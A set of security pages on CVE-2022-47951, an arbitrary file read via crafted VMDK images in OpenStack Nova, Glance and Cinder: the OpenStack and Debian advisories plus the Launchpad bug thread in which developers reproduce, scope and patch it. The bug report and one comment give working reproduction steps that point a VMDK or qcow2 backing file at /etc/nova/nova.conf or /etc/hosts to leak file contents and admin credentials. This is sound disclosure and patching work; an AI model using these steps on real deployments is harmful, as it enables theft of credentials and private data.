=== Content from security.openstack.org_15a73de5_20250114_210629.html ===


Toggle navigation

 Search

* [Software](https://www.openstack.org/software/)
  + [Overview](https://www.openstack.org/software/)
  + [OpenStack Components](https://www.openstack.org/software/project-navigator/openstack-components)
  + [SDKs](https://www.openstack.org/software/project-navigator/sdks)
  + [Deployment Tools](https://www.openstack.org/software/project-navigator/deployment-tools)
  + [OpenStack Map](https://www.openstack.org/assets/software/projectmap/openstack-map.pdf)
  + [Sample Configs](https://www.openstack.org/software/sample-configs/)
* [Use Cases](https://www.openstack.org/use-cases/)
  + [Users in Production](https://www.openstack.org/use-cases/)
  + [Ironic Bare Metal](https://www.openstack.org/use-cases/bare-metal/)
  + [Edge Computing](https://www.openstack.org/use-cases/edge-computing/)
  + [Telecom & NFV](https://www.openstack.org/use-cases/telecoms-and-nfv/)
  + [Science and HPC](https://www.openstack.org/use-cases/science/)
  + [Containers](https://www.openstack.org/use-cases/containers/)
  + [Enterprise](https://www.openstack.org/use-cases/enterprise/)
  + [User Survey](https://www.openstack.org/surveys/landing)
* [Events](https://openinfra.dev/summit)
  + [OpenInfra Summit](https://openinfra.dev/summit)
  + [Project Teams Gathering](https://www.openstack.org/ptg/)
  + [OpenDev](https://www.openstack.org/events/opendev-2020/)
  + [Community Events](https://www.openstack.org/events/community-events/)
  + [OpenStack & OpenInfra Days](https://www.openstack.org/events/openstackdays)
  + [Summit Videos](https://www.openstack.org/videos/)
* [Community](https://www.openstack.org/community/)
  + [Welcome! Start Here](https://www.openstack.org/community/)
  + [OpenStack Technical Committee](https://www.openstack.org/community/tech-committee)
  + [Speakers Bureau](https://www.openstack.org/community/speakers/)
  + [OpenStack Wiki](http://wiki.openstack.org)
  + [Get Certified (COA)](https://www.openstack.org/coa/)
  + [Jobs](https://www.openstack.org/community/jobs/)
  + [Marketing Resources](https://www.openstack.org/marketing/)
  + [Community News](https://www.openstack.org/news/)
  + [Superuser Magazine](http://superuser.openstack.org)
  + [OpenInfra Foundation Supporting Organizations](https://www.openstack.org/community/supporting-organizations/)
  + [OpenInfra Foundation](https://openinfra.dev)
* [Marketplace](https://www.openstack.org/marketplace/)
  + [Training](https://www.openstack.org/marketplace/training/)
  + [Distros & Appliances](https://www.openstack.org/marketplace/distros/)
  + [Public Clouds](https://www.openstack.org/marketplace/public-clouds/)
  + [Hosted Private Clouds](https://www.openstack.org/marketplace/hosted-private-clouds/)
  + [Remotely Managed Private Clouds](https://www.openstack.org/marketplace/remotely-managed-private-clouds/)
  + [Consulting & Integrators](https://www.openstack.org/marketplace/consulting/)
  + [Drivers](https://www.openstack.org/marketplace/drivers/)
* [Blog](https://www.openstack.org/blog/)
* [Docs](http://docs.openstack.org/)
* [Join](https://openinfra.dev/join/)
  + [Sign up for Foundation Membership](https://openinfra.dev/join/)
  + [Sponsor the Foundation](https://openinfra.dev/join/)
  + [More about the Foundation](https://openinfra.dev)
* [Log In](https://www.openstack.org/Security/login/?BackURL=/home/)

# OSSA-2023-002: Arbitrary file access through custom VMDK flat descriptor

# OSSA-2023-002: Arbitrary file access through custom VMDK flat descriptor[Â¶](#ossa-2023-002-arbitrary-file-access-through-custom-vmdk-flat-descriptor "Link to this heading")

Date:

January 24, 2023

CVE:

CVE-2022-47951

## Affects[Â¶](#affects "Link to this heading")

* Cinder, glance, nova: Cinder <19.1.2, >=20.0.0 <20.0.2, ==21.0.0; Glance <23.0.1, >=24.0.0 <24.1.1, ==25.0.0; Nova <24.1.2, >=25.0.0 <25.0.2, ==26.0.0

## Description[Â¶](#description "Link to this heading")

Guillaume Espanel, Pierre Libeau, Arnaud Morin and Damien Rannou (OVH) reported a vulnerability in VMDK image processing for Cinder, Glance and Nova. By supplying a specially created VMDK flat image which references a specific backing file path, an authenticated user may convince systems to return a copy of that fileâs contents from the server resulting in unauthorized access to potentially sensitive data. All Cinder deployments are affected; only Glance deployments with image conversion enabled are affected; all Nova deployments are affected.

## Patches[Â¶](#patches "Link to this heading")

* <https://review.opendev.org/871615> (2023.1/antelope(cinder))
* <https://review.opendev.org/871613> (2023.1/antelope(glance))
* <https://review.opendev.org/871612> (2023.1/antelope(nova))
* <https://review.opendev.org/871631> (Train(cinder))
* <https://review.opendev.org/871630> (Train(glance))
* <https://review.opendev.org/871629> (Ussuri(cinder))
* <https://review.opendev.org/871626> (Ussuri(glance))
* <https://review.opendev.org/871628> (Victoria(cinder))
* <https://review.opendev.org/871623> (Victoria(glance))
* <https://review.opendev.org/871627> (Wallaby(cinder))
* <https://review.opendev.org/871621> (Wallaby(glance))
* <https://review.opendev.org/871625> (Xena(cinder))
* <https://review.opendev.org/871619> (Xena(glance))
* <https://review.opendev.org/871622> (Xena(nova))
* <https://review.opendev.org/871620> (Yoga(cinder))
* <https://review.opendev.org/871617> (Yoga(glance))
* <https://review.opendev.org/871624> (Yoga(nova))
* <https://review.opendev.org/871618> (Zed(cinder))
* <https://review.opendev.org/871614> (Zed(glance))
* <https://review.opendev.org/871616> (Zed(nova))

## Credits[Â¶](#credits "Link to this heading")

* Guillaume Espanel from OVH (CVE-2022-47951)
* Pierre Libeau from OVH (CVE-2022-47951)
* Arnaud Morin from OVH (CVE-2022-47951)
* Damien Rannou from OVH (CVE-2022-47951)

## References[Â¶](#references "Link to this heading")

* <https://launchpad.net/bugs/1996188>
* <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-47951>

## Notes[Â¶](#notes "Link to this heading")

* The stable/wallaby, stable/victoria, stable/ussuri, and stable/train
  branches are under extended maintenance and will receive no new point
  releases, but patches for them are provided as a courtesy where
  possible.

this page last updated: 2025-01-07 18:17:35

[![Creative Commons Attribution 3.0 License](../_static/images/docs/license.png)](https://creativecommons.org/licenses/by/3.0/)

Except where otherwise noted, this document is licensed under
[Creative Commons
Attribution 3.0 License](https://creativecommons.org/licenses/by/3.0/). See all [OpenStack Legal Documents](https://www.openstack.org/legal).

found an error? report a bug

OpenStack Documentation

* Guides
* [Install Guides](https://docs.openstack.org/index.html#install-guides)
* [User Guides](https://docs.openstack.org/index.html#user-guides)
* [Configuration Guides](https://docs.openstack.org/index.html#configuration-guides)
* [Operations and Administration Guides](https://docs.openstack.org/index.html#ops-and-admin-guides)
* [API Guides](https://docs.openstack.org/index.html#api-guides)
* [Contributor Guides](https://docs.openstack.org/index.html#contributor-guides)
* Languages
* [Deutsch (German)](https://docs.openstack.org/de/)
* [FranÃ§ais (French)](https://docs.openstack.org/fr/)
* [Bahasa Indonesia (Indonesian)](https://docs.openstack.org/id/)
* [Italiano (Italian)](https://docs.openstack.org/it/)
* [æ¥æ¬èª (Japanese)](https://docs.openstack.org/ja/)
* [íêµ­ì´ (Korean)](https://docs.openstack.org/ko_KR/)
* [PortuguÃªs (Portuguese)](https://docs.openstack.org/pt_BR/)
* [TÃ¼rkÃ§e (TÃ¼rkiye)](https://docs.openstack.org/tr_TR/)
* [ç®ä½ä¸­æ (Simplified Chinese)](https://docs.openstack.org/zh_CN/)

#### Contents

* OSSA-2023-002: Arbitrary file access through custom VMDK flat descriptor
  + [Affects](#affects)
  + [Description](#description)
  + [Patches](#patches)
  + [Credits](#credits)
  + [References](#references)
  + [Notes](#notes)

### OpenStack

* [Projects](https://www.openstack.org/software/project-navigator/)
* [OpenStack Security](https://security.openstack.org/)
* [Blog](https://openstack.org/blog/)
* [News](https://openstack.org/news/)

### Community

* [User Groups](https://www.meetup.com/pro/openinfradev/)
* [Events](https://openstack.org/community/events/)
* [Jobs](https://openstack.org/community/jobs/)
* [Companies](https://openinfra.dev/members/)
* [Contribute](https://docs.openstack.org/contributors)

### Documentation

* [OpenStack Manuals](https://docs.openstack.org)
* [Getting Started](https://openstack.org/software/start/)
* [API Documentation](https://developer.openstack.org)
* [Wiki](https://wiki.openstack.org)

### Branding & Legal

* [Legal Docs](https://openinfra.dev/legal)
* [Logos & Guidelines](https://openstack.org/brand/)
* [Trademark Policy](https://openinfra.dev/legal/trademark-policy)
* [Privacy Policy](https://openinfra.dev/privacy-policy)
* [OpenInfra CLA](https://docs.openstack.org/contributors/common/setup-gerrit.html#individual-contributor-license-agreement)

### Stay In Touch

The OpenStack project is provided under the
[Apache 2.0 license](https://www.apache.org/licenses/LICENSE-2.0). Docs.openstack.org is powered by
[Rackspace Cloud Computing](https://rackspace.com).



=== Content from www.debian.org_dc805a4b_20250114_210630.html ===


---

[[Date Prev](msg00025.html)][[Date Next](msg00027.html)]
[[Thread Prev](msg00025.html)][[Thread Next](msg00027.html)]
[[Date Index](maillist.html#00026)]
[[Thread Index](threads.html#00026)]

# [SECURITY] [DSA 5337-1] nova security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 5337-1] nova security update
* *From*: Moritz Muehlenhoff <jmm@debian.org>
* *Date*: Wed, 1 Feb 2023 18:33:22 +0000
* *Message-id*: <Y9qwctI/R0t3Sjvr@seger.debian.org>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-5337-1                   security@debian.org
<https://www.debian.org/security/>                       Moritz Muehlenhoff
February 01, 2023                     <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : nova
CVE ID         : CVE-2022-47951
Debian Bug     : 1029561

Guillaume Espanel, Pierre Libeau, Arnaud Morin and Damien Rannou
discovered that missing input sanitising in the handling of VMDK images
in OpenStack Compute (codenamed Nova) may result in information
disclosure.

For the stable distribution (bullseye), this problem has been fixed in
version 2:22.0.1-2+deb11u1.

We recommend that you upgrade your nova packages.

For the detailed security status of nova please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/nova>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEtuYvPRKsOElcDakFEMKTtsN8TjYFAmParscACgkQEMKTtsN8
Tja1gg/+MkwvOlll4HJexIgD7/wK5QD7R+1gTHJ77ywF5JP8udygdAtC7BxxmxAe
jlnUfDwlN5rwvZI9PR6JjedwLx7r7urckUNNaRHz9ZZdRm7n1S+3YX4Am5d7V3Dw
z54NQ27GvBVoi7TTBoxDHmVZ2kX95EJYMMhGbyc1SiQx3Eg37iZII11f0CQG1Vrh
E6al8u19qMK/dUqmw4mPB0duUjSBK3b8wcXdgNtZP5H/rIJOfMZqaXNZUCs78zAP
jDAm2BcUljOpeW/RbkwjvZMWxIZdWS8XF1iWMqeDAJxBeU39VgOIQ6c0djCK3PZs
cSUbT3NHJZW7okyxqqEXrGbvnJgaO0PZqIcWpatDV6s1mScWbmkT2sAQjKLlo7kD
rPFVP8DzLstE+jqIzmT1dKK8X3hmIW7k6exCQINSoPIZco2tyHFrlyb42hTJIYpQ
LNZoEavRzH6ZYXTytvr89ldJ5w/pdtyf3S2DCkW+H4qXz03q9GyAHZN3eNMkhKmy
S11/JV3GC1nL+9obCIb8PqFF075vYp0EnKsEXmyi6KL9GK6bR82i9ePo6n3eNM8+
FxPRcCv8gzbWLg+pC7hrclS231C6SsDbVlYIbZBc0O4Kc8PkcnBVcjLJ71eXCIkQ
esZqWjnOYEshDfzG3xbWiiVOgGv0ypsB9GhKGcPGHRHEAn1k25k=
=U5a0
-----END PGP SIGNATURE-----

```

---



=== Content from launchpad.net_b2f07e76_20250114_210628.html ===

[Log in / Register](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Blogin)

[![](https://launchpadlibrarian.net/324577028/nova64.png)](https://launchpad.net/nova)

## [OpenStack Compute (nova)](https://launchpad.net/nova)

* [Overview](https://launchpad.net/nova)
* [Code](https://code.launchpad.net/nova)
* [Bugs](https://bugs.launchpad.net/nova)
* [Blueprints](https://blueprints.launchpad.net/nova)
* [Translations](https://translations.launchpad.net/nova)
* [Answers](https://answers.launchpad.net/nova)

# [OSSA-2023-002] Arbitrary file access through custom VMDK flat descriptor (CVE-2022-47951)

Bug #1996188 reported by
[Jeremy Stanley](https://launchpad.net/~fungi)
on 2022-11-10

[304](/%2Bhelp-bugs/bug-heat.html)

This bug affects 4 people

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [Cinder](https://bugs.launchpad.net/cinder) | Fix Released | Critical | Unassigned |  |
|  | [Glance](https://bugs.launchpad.net/glance) | Fix Released | Undecided | [Dan Smith](https://launchpad.net/~danms) |  |
|  | [OpenStack Compute (nova)](https://bugs.launchpad.net/nova) | Fix Released | Critical | Unassigned |  |
|  | [OpenStack Security Advisory](https://bugs.launchpad.net/ossa) | Fix Released | High | [Jeremy Stanley](https://launchpad.net/~fungi) |  |

### Bug Description

The vulnerability managers received the following report from Sébastien Meriot with OVH via encrypted E-mail:

Our Openstack team did discover what looks like a security issue in Nova this morning allowing a remote attacker to read any file on the system.

After making a quick CVSS calculation, we got a CVSS of 5.8 (CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:N/A:N).

Here is the details :

By using a VMDK file, you can dump any file on the hypervisor.

1. Create an image: qemu-img create -f vmdk leak.vmdk 1M -o subformat=monolithicFlat

2. Edit the leak.vmdk and change the name this way: RW 2048 FLAT "leak-flat.vmdk" 0 --> RW 2048 FLAT "/etc/nova/nova.conf" 0

3. Upload the image: openstack image create --file leak.vmdk leak.vmdk

4. Start a new instance: openstack server create --image leak.vmdk --net demo --flavor nano leak-instance

5. The instance won't boot of course. You can create an image from this instance: openstack server image create --name leak-instance-image leak-instance

6. Download the image: openstack image save --file leak-instance-image leak-instance-image

7. You get access to the nova.conf file content and you can get access to the openstack admin creds.

We are working on a fix and would be happy to share it with you if needed.

We think it does affect Nova but it could affect Glance as well. We're not sure yet.

[postscript per Arnaud Morin (amorin) in IRC]

cinder seems also affected

See [original description](comments/0)

Tags:

[in-stable-train](/nova/%2Bbugs?field.tag=in-stable-train)
[in-stable-ussuri](/nova/%2Bbugs?field.tag=in-stable-ussuri)
[in-stable-victoria](/nova/%2Bbugs?field.tag=in-stable-victoria)
[in-stable-wallaby](/nova/%2Bbugs?field.tag=in-stable-wallaby)
[in-stable-xena](/nova/%2Bbugs?field.tag=in-stable-xena)
[in-stable-yoga](/nova/%2Bbugs?field.tag=in-stable-yoga)
[in-stable-zed](/nova/%2Bbugs?field.tag=in-stable-zed)

## CVE References

* [2022-47951](/bugs/cve/2022-47951 "An issue was discovered in OpenStack ...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2022-11-10: |  |  | [#1](/nova/%2Bbug/1996188/comments/1) |
| --- | --- | --- | --- |

Since this report concerns a possible security risk, an incomplete

security advisory task has been added while the core security

reviewers for the affected project or projects confirm the bug and

discuss the scope of any vulnerability along with potential

solutions.

I've started with just Nova even though the reporters mention Glance and Cinder, since it's unclear (at least to me) precisely which project(s) could need fixes. We can widen the discussion to include those teams after initial triage from Nova's security folks indicates it's warranted.

Since this report concerns a possible security risk, an incomplete
security advisory task has been added while the core security
reviewers for the affected project or projects confirm the bug and
discuss the scope of any vulnerability along with potential
solutions.
I've started with just Nova even though the reporters mention Glance and Cinder, since it's unclear (at least to me) precisely which project(s) could need fixes. We can widen the discussion to include those teams after initial triage from Nova's security folks indicates it's warranted.

| Changed in ossa: | |
| --- | --- |
| **status**: | New → Incomplete |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dan Smith (danms)](https://launchpad.net/~danms) wrote on 2022-11-10: |  |  | [#2](/nova/%2Bbug/1996188/comments/2) |
| --- | --- | --- | --- |

Here's a reproducer of the underlying operation without the need for any nova or glance:

qemu-img create -f vmdk leak.vmdk 1M -o subformat=monolithicFlat

sed -i 's#leak-flat.vmdk#/etc/hosts#' leak.vmdk

qemu-img convert -f vmdk -O raw leak.vmdk leak.raw

head -n1 leak.raw

Note that I can repro the behavior with qemu-img using qcow2 as well:

qemu-img create -f qcow2 -F raw -b /etc/hosts leak.qcow 1M

qemu-img convert -O raw leak.qcow leak2.raw

head -n1 leak2.raw

Which means even people that don't use vmdk can't just ban that format to work around this, I suspect.

This helps quantify what I think is going on here under the covers so we can determine which other projects are affected. Glance does effectively the above commands if image conversion is enabled, so I suspect it is affected without needing nova at all, if and when image conversion is in use. I'll have to check.

Not sure about cinder, but I suspect if it can lay down a COW-based image on a volume in raw format, it too is probably affected.

I'm guessing that maybe we'll need to come up with some difficult rules about backing file locations and inspect/reject based on those. I would say that nova requiring that backing files are in /var/lib/nova would be enough, but that wouldn't prevent me from snooping someone else's image if I could determine their UUID.

Here's a reproducer of the underlying operation without the need for any nova or glance:
qemu-img create -f vmdk leak.vmdk 1M -o subformat=monolithicFlat
sed -i 's#leak-flat.vmdk#/etc/hosts#' leak.vmdk
qemu-img convert -f vmdk -O raw leak.vmdk leak.raw
head -n1 leak.raw
Note that I can repro the behavior with qemu-img using qcow2 as well:
qemu-img create -f qcow2 -F raw -b /etc/hosts leak.qcow 1M
qemu-img convert -O raw leak.qcow leak2.raw
head -n1 leak2.raw
Which means even people that don't use vmdk can't just ban that format to work around this, I suspect.
This helps quantify what I think is going on here under the covers so we can determine which other projects are affected. Glance does effectively the above commands if image conversion is enabled, so I suspect it is affected without needing nova at all, if and when image conversion is in use. I'll have to check.
Not sure about cinder, but I suspect if it can lay down a COW-based image on a volume in raw format, it too is probably affected.
I'm guessing that maybe we'll need to come up with some difficult rules about backing file locations and inspect/reject based on those. I would say that nova requiring that backing files are in /var/lib/nova would be enough, but that wouldn't prevent me from snooping someone else's image if I could determine their UUID.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Guillaume Espanel (guillaume-espanel)](https://launchpad.net/~guillaume-espanel) wrote on 2022-11-10: |  |  | [#3](/nova/%2Bbug/1996188/comments/3) |
| --- | --- | --- | --- |

About qcow2:

It seems that nova refuses to convert qcow2 images that have a backing file, at least here:

<https://opendev.org/openstack/nova/src/commit/c97507dfcd57cce9d76670d3b0d48538900c00e9/nova/virt/images.py#L127>

Same for cinder: <https://opendev.org/openstack/cinder/src/commit/dcec2f6f01ffc63dc058f641370e9f5a0bad07e4/cinder/image/image_utils.py#L659>

I think glance also rejects qcow2 that have backing files:

<https://opendev.org/openstack/glance/src/branch/master/glance/async_/flows/base_import.py#L178>

but I am not sure that's the case everywhere.

About qcow2:
It seems that nova refuses to convert qcow2 images that have a backing file, at least here:
https://opendev.org/openstack/nova/src/commit/c97507dfcd57cce9d76670d3b0d48538900c00e9/nova/virt/images.py#L127
Same for cinder: https://opendev.org/openstack/cinder/src/commit/dcec2f6f01ffc63dc058f641370e9f5a0bad07e4/cinder/image/image\_utils.py#L659
I think glance also rejects qcow2 that have backing files:
https://opendev.org/openstack/glance/src/branch/master/glance/async\_/flows/base\_import.py#L178
but I am not sure that's the case everywhere.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dan Smith (danms)](https://launchpad.net/~danms) wrote on 2022-11-10: |  |  | [#4](/nova/%2Bbug/1996188/comments/4) |
| --- | --- | --- | --- |

Cool, on nova and cinder for qcow2. Glance would need to check that during/before the image format conversion, because the code you linked there would happen after we've already converted it to raw, I think. I don't see such a check here:

<https://opendev.org/openstack/glance/src/branch/master/glance/async_/flows/plugins/image_conversion.py>

That is an optional plugin, requires being enabled, and only impacts images being imported (not uploaded). So, a much smaller surface.

Cool, on nova and cinder for qcow2. Glance would need to check that during/before the image format conversion, because the code you linked there would happen after we've already converted it to raw, I think. I don't see such a check here:
https://opendev.org/openstack/glance/src/branch/master/glance/async\_/flows/plugins/image\_conversion.py
That is an optional plugin, requires being enabled, and only impacts images being imported (not uploaded). So, a much smaller surface.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Sylvain Bauza (sylvain-bauza)](https://launchpad.net/~sylvain-bauza) wrote on 2022-11-10: |  |  | [#5](/nova/%2Bbug/1996188/comments/5) |
| --- | --- | --- | --- |

Could we clarify the attacking surface, please ?

From what I see, the nova libvirt driver calls fetch\_image() which does the backing file check \*before\* converting the image, so could we confirm that all environments having compute services configured to use the libvirt driver \*aren't\* impacted ?

For other convert operations that could be run by Glance, Cinder or nova-computes not using the libvirt driver, I tho totally agree : yes, we can dump any file.

Could we clarify the attacking surface, please ?
From what I see, the nova libvirt driver calls fetch\_image() which does the backing file check \*before\* converting the image, so could we confirm that all environments having compute services configured to use the libvirt driver \*aren't\* impacted ?
For other convert operations that could be run by Glance, Cinder or nova-computes not using the libvirt driver, I tho totally agree : yes, we can dump any file.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dan Smith (danms)](https://launchpad.net/~danms) wrote on 2022-11-10: |  |  | [#6](/nova/%2Bbug/1996188/comments/6) |
| --- | --- | --- | --- |

The backing file check in fetch\_image() only applies to qcow2, not vmdk. If we make it to there with a VMDK file, the backing\_file check won't apply and we'll do the bad thing during the raw conversion.

That said, I just realized that our image type support for libvirt does not declare that we support VMDK. That means \*if\* you have that feature enabled, we won't ever send instances to libvirt computes if a VMDK image is used. That further limits the scope of impacted people (and versions), but I think if you have that disabled, you'll still get there.

I assume the reporter was using the libvirt driver but I suppose it's worth checking.

Either way, I'm testing a patch to detect/reject this in nova now.

The backing file check in fetch\_image() only applies to qcow2, not vmdk. If we make it to there with a VMDK file, the backing\_file check won't apply and we'll do the bad thing during the raw conversion.
That said, I just realized that our image type support for libvirt does not declare that we support VMDK. That means \*if\* you have that feature enabled, we won't ever send instances to libvirt computes if a VMDK image is used. That further limits the scope of impacted people (and versions), but I think if you have that disabled, you'll still get there.
I assume the reporter was using the libvirt driver but I suppose it's worth checking.
Either way, I'm testing a patch to detect/reject this in nova now.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dan Smith (danms)](https://launchpad.net/~danms) wrote on 2022-11-10: |  |  | [#7](/nova/%2Bbug/1996188/comments/7) |
| --- | --- | --- | --- |

* [nova-1996188.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5630408/%2Bfiles/nova-1996188.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5630408)
  (5.8 KiB,
  text/plain)

Okay, I confirmed that I can hit the libvirt compute node with a vmdk file, using the default config, and specifically the bad format image specified in the bug description. I'm attaching a proposed patch for nova which restricts the allowed VMDK types to just the two we think are usable with nova/glance anyway. However, it adds a config option (as discussed) to allow overriding or eliminating this check to avoid breaking people that are successfully using another subtype without a way to work around it.

With this patch applied and the above-mentioned maliciously-crafted image, I get a failed server build and this log message:

Nov 10 10:35:18 ubuntu nova-compute[119048]: WARNING nova.virt.images [None req-1cd34d51-ed13-488b-90eb-27c135e8bf0f demo admin] Refusing to process VMDK file with create-type of 'monolithicFlat' which is not in allowed set of: streamOptimized,monolithicSparse

Okay, I confirmed that I can hit the libvirt compute node with a vmdk file, using the default config, and specifically the bad format image specified in the bug description. I'm attaching a proposed patch for nova which restricts the allowed VMDK types to just the two we think are usable with nova/glance anyway. However, it adds a config option (as discussed) to allow overriding or eliminating this check to avoid breaking people that are successfully using another subtype without a way to work around it.
With this patch applied and the above-mentioned maliciously-crafted image, I get a failed server build and this log message:
Nov 10 10:35:18 ubuntu nova-compute[119048]: WARNING nova.virt.images [None req-1cd34d51-ed13-488b-90eb-27c135e8bf0f demo admin] Refusing to process VMDK file with create-type of 'monolithicFlat' which is not in allowed set of: streamOptimized,monolithicSparse

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Arnaud Morin (arnaud-morin)](https://launchpad.net/~arnaud-morin) wrote on 2022-11-10: |  |  | [#8](/nova/%2Bbug/1996188/comments/8) |
| --- | --- | --- | --- |

Hello,

I confirme that de are using the libvirt driver.

Hello,
I confirme that de are using the libvirt driver.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Brian Rosmaita (brian-rosmaita)](https://launchpad.net/~brian-rosmaita) wrote on 2022-11-10: |  |  | [#9](/nova/%2Bbug/1996188/comments/9) |
| --- | --- | --- | --- |

Code LGTM. I do have a concern about the config opt, namely, that the default is

vmdk\_allowed\_types = ['streamOptimized', 'monolithicSparse']

and if you set it like this:

vmdk\_allowed\_types = [ ]

The behavior is "allow all" ... which the help text mentions, but I think this is very easy to mis-configure, because if you only want 'streamOptimized' you remove 'monolithicSparse' from the list, and following that logic, if you don't want any, you'll remove 'streamOptimized' too ... but the behavior will be the exact opposite of what you expect. So I'd prefer an empty list mean "don't allow any".

The downside is that if someone does want to allow all possible formats, they'll have to list them all. Or we could introduce a sentinel value like 'vmdk\_allowed\_types\_ANY'

vmdk\_allowed\_types = ['vmdk\_allowed\_types\_ANY']

and hope that vmware doesn't introduce a 'vmdk\_allowed\_types\_ANY' subformat.

But the other upside of [] == "none" is that use of vmdk can be turned off in Nova without having to depend on the disk\_formats setting in Glance. It would also handle the problem of existing vmdks in deployments that don't actually use vmdk, but are using the default disk\_formats value in Glance (which includes vmdk).

Code LGTM. I do have a concern about the config opt, namely, that the default is
vmdk\_allowed\_types = ['streamOptimized', 'monolithicSparse']
and if you set it like this:
vmdk\_allowed\_types = [ ]
The behavior is "allow all" ... which the help text mentions, but I think this is very easy to mis-configure, because if you only want 'streamOptimized' you remove 'monolithicSparse' from the list, and following that logic, if you don't want any, you'll remove 'streamOptimized' too ... but the behavior will be the exact opposite of what you expect. So I'd prefer an empty list mean "don't allow any".
The downside is that if someone does want to allow all possible formats, they'll have to list them all. Or we could introduce a sentinel value like 'vmdk\_allowed\_types\_ANY'
vmdk\_allowed\_types = ['vmdk\_allowed\_types\_ANY']
and hope that vmware doesn't introduce a 'vmdk\_allowed\_types\_ANY' subformat.
But the other upside of [] == "none" is that use of vmdk can be turned off in Nova without having to depend on the disk\_formats setting in Glance. It would also handle the problem of existing vmdks in deployments that don't actually use vmdk, but are using the default disk\_formats value in Glance (which includes vmdk).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dan Smith (danms)](https://launchpad.net/~danms) wrote on 2022-11-10: |  |  | [#10](/nova/%2Bbug/1996188/comments/10) |
| --- | --- | --- | --- |

Yep, I was going for the minimal amount of work for someone to get back to the existing behavior if this ends up cutting off a workflow for them.

I don't love the magic sentinel approach, and would prefer to just go with "empty means nothing is enabled" and make people enable what they need for now. If there's a big push-back we can work on a sentinel to disable it entirely, but in reality I expect not many people actually want to boot from VMDKs with the libvirt driver.

If there are other sane formats to add to the default list, then hopefully they'll report them too.

I'll let other people comment on the patch with the assumption that we'll flip the meaning of an empty list and will update it here after that (or after nobody has other comments).

Yep, I was going for the minimal amount of work for someone to get back to the existing behavior if this ends up cutting off a workflow for them.
I don't love the magic sentinel approach, and would prefer to just go with "empty means nothing is enabled" and make people enable what they need for now. If there's a big push-back we can work on a sentinel to disable it entirely, but in reality I expect not many people actually want to boot from VMDKs with the libvirt driver.
If there are other sane formats to add to the default list, then hopefully they'll report them too.
I'll let other people comment on the patch with the assumption that we'll flip the meaning of an empty list and will update it here after that (or after nobody has other comments).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Sylvain Bauza (sylvain-bauza)](https://launchpad.net/~sylvain-bauza) wrote on 2022-11-10: |  |  | [#11](/nova/%2Bbug/1996188/comments/11) |
| --- | --- | --- | --- |

This patch looks good to me as well at least for the nova libvirt driver.

This patch looks good to me as well at least for the nova libvirt driver.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Arnaud Morin (arnaud-morin)](https://launchpad.net/~arnaud-morin) wrote on 2022-11-11: |  |  | [#12](/nova/%2Bbug/1996188/comments/12) |
| --- | --- | --- | --- |

The patch looks good. Are we sure we are always going through the fetch\_to\_raw function?

I'll try to take some time to test it on our infra and let you know.

Thanks

The patch looks good. Are we sure we are always going through the fetch\_to\_raw function?
I'll try to take some time to test it on our infra and let you know.
Thanks

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Guillaume Espanel (guillaume-espanel)](https://launchpad.net/~guillaume-espanel) wrote on 2022-11-11: |  |  | [#13](/nova/%2Bbug/1996188/comments/13) |
| --- | --- | --- | --- |

Looks good to me too, for nova. I looked a bit yesterday that the two variants we plan to allow cannot be tweaked to leak data through qemu-img convert and they seem fine, at least with the simple path change on the extent entry.

Speaking of fetch\_to\_raw, what I understand is that we let qemu-img info tell us what format the image is in before converting:

<https://opendev.org/openstack/nova/src/commit/2a73a1db84da15a24231f7219f6c4a4ea574bae6/nova/virt/images.py#L120>

I am not sure we should be doing that (see the comment in convert\_image\_unsafe).

Looks good to me too, for nova. I looked a bit yesterday that the two variants we plan to allow cannot be tweaked to leak data through qemu-img convert and they seem fine, at least with the simple path change on the extent entry.
Speaking of fetch\_to\_raw, what I understand is that we let qemu-img info tell us what format the image is in before converting:
https://opendev.org/openstack/nova/src/commit/2a73a1db84da15a24231f7219f6c4a4ea574bae6/nova/virt/images.py#L120
I am not sure we should be doing that (see the comment in convert\_image\_unsafe).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dan Smith (danms)](https://launchpad.net/~danms) wrote on 2022-11-11: |  |  | [#14](/nova/%2Bbug/1996188/comments/14) |
| --- | --- | --- | --- |

You know, I really thought we did assert the source type of the image when we fetch it. But looking through all of that, at least as it exists today, I see that we're not. Since the previous requirement for doing that was to protect against the qcow2 backing\_file attack, the comments referencing fetch\_to\_raw() as some sort of safety measure must be referencing the backing\_file check itself.

